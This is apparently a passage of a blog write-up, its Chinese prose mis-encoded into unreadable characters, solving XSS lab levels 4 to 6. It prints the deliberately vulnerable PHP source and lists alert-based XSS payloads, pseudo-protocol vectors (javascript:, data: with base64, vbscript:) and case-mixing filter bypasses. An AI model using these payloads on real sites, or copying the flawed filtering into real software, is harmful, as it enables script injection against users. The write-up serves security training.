<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level5.php?keyword=find a way out!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level4&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level4&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);  <span class="comment">//é”™è¯¯å±•ç¤ºï¼Œ0è¡¨ç¤ºä¸å±•ç¤ºé”™è¯¯ï¼Œå³æœåŠ¡å™¨å…³é—­é”™è¯¯å›æ˜¾</span></span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);   <span class="comment">//str_resplace(&quot;è¢«æ›¿æ¢å­—ç¬¦&quot;,&quot;æ›¿æ¢å­—ç¬¦&quot;,å˜é‡)</span></span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="comment">//æ²¡æœ‰ä½¿ç”¨ Htmlspecialcharså‡½æ•°å¯¹å­—ç¬¦è¿›è¡Œå®ä¾‹åŒ–è½¬ä¹‰</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;  </span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str3</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><p>è§£é¢˜æ€è·¯ï¼š</p>
<p>ç±»å‹ï¼šè¾“å…¥æ¡†ç±»å‹</p>
<p>è¾“å…¥æµ‹è¯•è¯­å¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_14.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>æ‹¬å·å†…çš„åŒå¼•å·æ²¡æœ‰è¢«æ›¿æ¢æˆ–å®ä¾‹åŒ–è½¬ä¹‰</li>
<li>æ‹¬å·å†…çš„åŒå¼•å·ä¸valueçš„åŒå¼•å·é—­åˆ</li>
<li>åˆ†ä¸ºæ©™è‰²ï¼Œè“è‰²è“éƒ¨åˆ†</li>
<li>scriptæ ‡ç­¾èƒŒæ›¿æ¢</li>
</ul>
<p>å°è¯•é—­åˆ</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_15.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>é—­åˆåæ ‡ç­¾é€ƒé€¸inputæ ‡ç­¾</li>
<li>scriptæ ‡ç­¾è¢«æ”¹å˜</li>
</ul>
<p>æ—¢ç„¶æ ‡ç­¾è¢«ç ´åï¼Œå°è¯•æ³¨å…¥å±æ€§</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot; onclick=&#x27;alert(&quot;123&quot;)&#x27; //</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_16.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>onclick å±æ€§ä¹Ÿè¢«æ›¿æ¢</p>
<h3 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="*ä¼ªåè®®"></a>*ä¼ªåè®®</h3><blockquote>
<p>åœ¨ Web å®‰å…¨ä¸­ï¼Œâ€œä¼ªåè®®â€ï¼ˆPseudo-protocolï¼‰ç‰¹æŒ‡æµè§ˆå™¨æ”¯æŒçš„æŸäº›ç‰¹æ®Š URL åè®®æ ¼å¼ï¼Œå®ƒä»¬å¹¶éçœŸæ­£çš„ç½‘ç»œä¼ è¾“åè®®ï¼ˆå¦‚ http:&#x2F;&#x2F; æˆ– https:&#x2F;&#x2F;ï¼‰ï¼Œè€Œæ˜¯ç”¨äºè§¦å‘ç‰¹å®šè¡Œä¸ºæˆ–æ‰§è¡Œä»£ç ã€‚åœ¨ XSSï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»ï¼‰ åœºæ™¯ä¸­ï¼Œä¼ªåè®®å¸¸è¢«ç”¨æ¥ç»•è¿‡è¿‡æ»¤è§„åˆ™ï¼Œç›´æ¥æ³¨å…¥æ¶æ„è„šæœ¬ã€‚</p>
</blockquote>
<blockquote>
<p>1.javascript:åœ¨ URL ä¸­æ‰§è¡Œ			XSS æ”»å‡» -&gt; JavaScript ä»£ç 	javascript:alert(1)<br>2.data:åµŒå…¥ Base64 ç¼–ç çš„å†…å®¹ï¼ˆHTML&#x2F;è„šæœ¬ç­‰è¿‡å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰-&gt;			 data:text&#x2F;html,[script]alert(1)[&#x2F;script]<br>3.vbscript:åœ¨æ—§ç‰ˆ IE ä¸­æ‰§è¡Œ VBScript ä»£ç  IE ç‰¹å®šæ¼æ´  -&gt;   vbscript:MsgBox(â€œXSSâ€)<br>4.about:æ˜¾ç¤ºæµè§ˆå™¨å†…éƒ¨ä¿¡æ¯æˆ–ç©ºç™½é¡µé¢	 -&gt;   about:blank</p>
</blockquote>
<ul>
<li>jsåè®®:æœ€å¸¸è§çš„ XSS åˆ©ç”¨æ–¹å¼ï¼Œé€šè¿‡å°†ä¼ªåè®®æ³¨å…¥åˆ°å…è®¸ URL çš„å±æ€§ä¸­ï¼ˆå¦‚ <a> æ ‡ç­¾çš„ hrefï¼‰ï¼Œè§¦å‘è„šæœ¬æ‰§è¡Œ</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">åŸºæœ¬æ ¼å¼  javascript:JavaScriptä»£ç         //æ³¨æ„ï¼šè‹¥jsä»£ç æœ‰å¤šè¡Œï¼Œç”¨åˆ†å·åˆ†å‰²</span><br><span class="line">è‹¥è¦è¿›è¡Œç¼–ç ç»•è¿‡æ—¶ï¼Œè¦å¯¹&#x27; :JavaScriptä»£ç   &#x27; //æ³¨æ„ï¼šè¿™ä¸€éƒ¨åˆ†è¿›è¡Œç¼–ç ï¼ˆåŒ…æ‹¬å†’å·ï¼‰-&gt; æµè§ˆå™¨ä¼šè‡ªåŠ¨è§£ç </span><br><span class="line">è¿”å›å€¼ä¸ºç©ºï¼Œä¸ºé¿å…å› è¿”å›å€¼å½±å“é¡µé¢è¡Œä¸º è®¾ç½®void(0)</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0);alert(1)&quot;</span>&gt;</span>ç‚¹å‡»<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¸¸ç”¨è¯­å¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span>ç‚¹å‡»è§¦å‘<span class="tag">&lt;/<span class="name">a</span>&gt;</span>       				//æ³¨å…¥ javascript: è§¦å‘ç‚¹å‡»æ‰§è¡Œ</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:&#x27;alert(1)&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>                      //åˆ©ç”¨ javascript: åŠ¨æ€å†™å…¥å†…å®¹</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;jav<span class="symbol">&amp;#x61;</span>script:alert(1)&quot;</span>&gt;</span>ç‚¹å‡»<span class="tag">&lt;/<span class="name">a</span>&gt;</span>        				  //ä½¿ç”¨ URL ç¼–ç æˆ– Unicode ç»•è¿‡å…³é”®å­—è¿‡æ»¤ï¼Œè§£ç å³ä¸ºjavascript</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>ç‚¹å‡»<span class="tag">&lt;/<span class="name">a</span>&gt;</span>     	 //åˆ©ç”¨ onclick äº‹ä»¶è¦†ç›– href è¡Œä¸ºï¼ˆéœ€ç”¨æˆ·äº¤äº’ï¼‰</span><br></pre></td></tr></table></figure>
<ul>
<li>dataåè®®ï¼šé€šè¿‡åµŒå…¥ Base64 ç¼–ç çš„ HTML æˆ–è„šæœ¬ï¼Œç»•è¿‡æŸäº›è¿‡æ»¤è§„åˆ™ï¼š</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">åŸºæœ¬æ ¼å¼ data:[<span class="tag">&lt;<span class="name">MIMEç±»å‹</span>&gt;</span>][;charset=<span class="tag">&lt;<span class="name">å­—ç¬¦é›†</span>&gt;</span>][;base64],<span class="tag">&lt;<span class="name">æ•°æ®å†…å®¹</span>&gt;</span></span><br><span class="line">1.MIME ç±»å‹ï¼šå£°æ˜æ•°æ®ç±»å‹ï¼ˆå¦‚ text/htmlã€text/javascriptï¼‰ã€‚</span><br><span class="line">2.Base64 ç¼–ç ï¼šå¯é€‰å‚æ•°ï¼Œç”¨äºç¼–ç äºŒè¿›åˆ¶æˆ–ç‰¹æ®Šå­—ç¬¦å†…å®¹ã€‚</span><br><span class="line">3.æµè§ˆå™¨æ”¯æŒï¼šç°ä»£æµè§ˆå™¨å¹¿æ³›æ”¯æŒï¼Œä½†å— CSPï¼ˆå†…å®¹å®‰å…¨ç­–ç•¥ï¼‰é™åˆ¶ã€‚</span><br><span class="line"></span><br><span class="line">æ”»å‡»å½¢å¼ï¼šå‚è€ƒä»¥ä¸‹å¸¸ç”¨è¯­å¥</span><br></pre></td></tr></table></figure>
<p>å¸¸ç”¨è¯­å¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span>  		//object æ ‡ç­¾çš„ data å±æ€§æ³¨å…¥ Base64 ç¼–ç çš„è„šæœ¬</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span> 		  //iframe çš„ src å±æ€§ï¼Œé€šè¿‡ data: åŠ è½½æ¶æ„ HTML</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:,&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>  						//çœç•¥ MIME ç±»å‹ï¼ŒæŸäº›æµè§ˆå™¨å…è®¸çœç•¥ text/html å£°æ˜</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;data:text/javascript,alert(1)&quot;</span>&gt;</span>ç‚¹å‡»<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 							  //ç»“åˆ JavaScript æ‰§è¡Œï¼Œç›´æ¥é€šè¿‡ data: æ‰§è¡Œ JS ä»£ç </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>vbscriptåè®®ï¼šä»…é€‚ç”¨äºæ—§ç‰ˆ IEï¼Œæ‰§è¡Œ VBScript ä»£ç </li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;vbscript:MsgBox(&#x27;XSS&#x27;)&quot;</span>&gt;</span>è§¦å‘<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>bout:é€šå¸¸ç”¨äºåŠ è½½ç©ºç™½é¡µé¢ï¼Œä½†å¯èƒ½ç»“åˆå…¶ä»–æ¼æ´åˆ©ç”¨</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;about:blank&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>æ­£å¼è§£é¢˜ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">ç¤ºä¾‹1ï¼š</span><br><span class="line">&quot;&gt;  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(&quot;123&quot;)&#x27;</span>&gt;</span> 1<span class="tag">&lt;/<span class="name">a</span>&gt;</span> //</span><br><span class="line">è§£é‡Šï¼š&quot;é—­åˆvalueçš„åŒå¼•å·ï¼Œç´§è·Ÿçš„&gt;ä¸&quot;å…±åŒå®ç°å­—ç¬¦é€ƒé€¸ï¼Œä½¿ç”¨<span class="tag">&lt;<span class="name">a</span>&gt;</span>æ ‡ç­¾çš„å±æ€§href+jsåè®®</span><br></pre></td></tr></table></figure>
<p>ç½‘é¡µæºç ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_17.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>é¡µé¢æ¸²æŸ“ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_18.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>ç‚¹å‡»è¶…é“¾æ¥â€˜1â€™ï¼Œå³å¯é€šå…³</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">ç¤ºä¾‹2ï¼š</span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span> //</span><br><span class="line">åŠ¨æ€åˆ›å»ºæ ‡ç­¾é¡µé¢ï¼Œå½“æ ‡ç­¾é¡µé¢è¢«åˆ›å»ºæ—¶è‡ªåŠ¨æ‰§è¡Œjsä»£ç </span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_19.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>æ­¤æ—¶çš„é¡µé¢æ¸²æŸ“ï¼š</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_20.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<h3 id="è¶£äº‹"><a href="#è¶£äº‹" class="headerlink" title="*è¶£äº‹"></a>*è¶£äº‹</h3><p>æ­¤æ—¶ä½ ä¸æ–­åˆ·æ–°é¡µé¢ï¼Œé¡µé¢ä¼šä¸æ–­å¼¹æ¡†ï¼ˆåˆ·æ–°ä¸€æ¬¡å¼¹æ¡†ä¸€æ¬¡ï¼‰</p>
<p>å¯¹äºjsåè®®çš„å‰©ä¸‹ç¼–ç ç¤ºä¾‹ä¸onclickè¦†ç›–å°±ä¸å†æ¼”ç¤º,ä»¥ä¸‹ä¸ºå…·ä½“è¾“å…¥è¯­å¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;jav<span class="symbol">&amp;#x61;</span>script:alert(1)&quot;</span>&gt;</span>ç‚¹å‡»<span class="tag">&lt;/<span class="name">a</span>&gt;</span> </span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>ç‚¹å‡»<span class="tag">&lt;/<span class="name">a</span>&gt;</span>     //æ³¨æ„æœ¬é¢˜ä¸å¯ä»¥ä½¿ç”¨onclik </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯¹äºç¼–ç ï¼Œæœ‰éœ€è¦çš„å¯ä»¥ä¸‹è½½æ’ä»¶ï¼šCaptfEncoder,ç¼–ç çš„ä½œç”¨åœ¨äºå¯ä»¥ç»•è¿‡ä¸€äº›æ˜æ–‡çš„è¿‡æ»¤</p>
<hr>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level6.php?keyword=break it out!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level5&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level5&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="comment">//ä½¿ç”¨str_replaceæ›¿æ¢å­—ç¬¦  è¿‡æ»¤äº†&lt;  ä½¿ç”¨ä¼ªåè®®ä¸ä¼šæ¶‰åŠ&lt; </span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str3</span>.<span class="string">&#x27;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿›ä¸€æ­¥è§£é‡Šå®ä¾‹åŒ–è½¬ä¹‰å‡½æ•°Htmlspecialchars()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $str = &quot;Tom&#x27;s \&quot;house\&quot; &amp; &lt;garden&gt;&quot;;</span></span><br><span class="line"><span class="comment">// echo htmlspecialchars($str);                // é»˜è®¤: Tom&#x27;s&amp;quot;house&amp;quot; &amp;amp; &amp;lt;garden&amp;gt;</span></span><br><span class="line"><span class="comment">// echo htmlspecialchars($str, ENT_QUOTES);    // è½¬ä¹‰å•å¼•å·: Tom&amp;#039;s &amp;quot;house&amp;quot; &amp;amp; &amp;lt;garden&amp;gt;</span></span><br><span class="line"><span class="comment">// echo htmlspecialchars($str, ENT_NOQUOTES);  // ä¸è½¬ä¹‰å¼•å·: Tom&#x27;s &quot;house&quot; &amp;amp; &amp;lt;garden&amp;gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str3</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>ç±»å‹ï¼šè¾“å…¥æ¡†ç±»å‹</p>
<p>è§£é¢˜æ€è·¯ï¼š</p>
<p>ç®€åŒ–æµç¨‹ï¼Œç”±äºæ˜¯è¾“å…¥æ¡†ç±»å‹ï¼Œç›´æ¥è¾“å…¥è¯­å¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_21.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">

<ul>
<li>åŒå¼•å·æ²¡æœ‰è¢«å®ä¾‹åŒ–è½¬ä¹‰æˆ–è¿‡æ»¤</li>
<li>å®ç°äº†å­—ç¬¦é€ƒé€¸</li>
<li>scriptæ ‡ç­¾è¢«æ›¿æ¢</li>
<li>ä½¿ç”¨onclick,ä¹Ÿä¼šè¢«æ›¿æ¢ï¼ˆè‡ªä¸»æµ‹è¯•ï¼Œä¸æ¼”ç¤ºï¼‰</li>
</ul>
<p>è¿‡æ»¤scriptåˆ™ä¸ç”¨script,ç”¨ä¼ªåè®®</p>
<p>æƒ…å†µä¸level5ç±»ä¼¼ï¼Œåˆ™é€‰æ‹©è¯­å¥ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&#x27;javascript:alert(&quot;123&quot;)&#x27;</span>&gt;</span>ç‚¹å‡»<span class="tag">&lt;/<span class="name">a</span>&gt;</span> //</span><br></pre></td></tr></table></figure>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_22.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<p>æ­¤æ—¶çš„é¡µé¢æ¸²æŸ“</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_23.png" class="" title="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">
<ul>
<li>æ ‡ç­¾å®ç°é€ƒé€¸</li>
<li>href è¢«æ›¿æ¢</li>
</ul>
<h3 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="*å¤§å°å†™ç»•è¿‡"></a>*å¤§å°å†™ç»•è¿‡</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">sCript</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;123&quot;</span>);</span><span class="tag">&lt;/<span class="name">scRipt</span>&gt;</span> </span><br></pre></td></tr></table></figure>
<p>æˆåŠŸé€šå…³</p>
<ul>
<li>ç–‘é—®ï¼šä¸ºä»€ä¹ˆå‰é¢çš„å…³å¡ä¸ä½¿ç”¨å¤§å°å†™ç»•è¿‡å‘¢ï¼Ÿæˆ–æ˜¯è¯´ä¸ºä»€ä¹ˆè¿™å…³å¯ä»¥ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼Ÿä»£ç åˆ†æè§£ç­”</li>
</ul>
<p>æºç åˆ†æï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);</span><br><span class="line"> window.location.href=<span class="string">&quot;level7.php?keyword=move up!&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;æ¬¢è¿æ¥åˆ°level6&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level6&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);  <span class="comment">//æ›¿æ¢scriptæ ‡ç­¾</span></span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);          <span class="comment">//æ›¿æ¢on </span></span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);		 <span 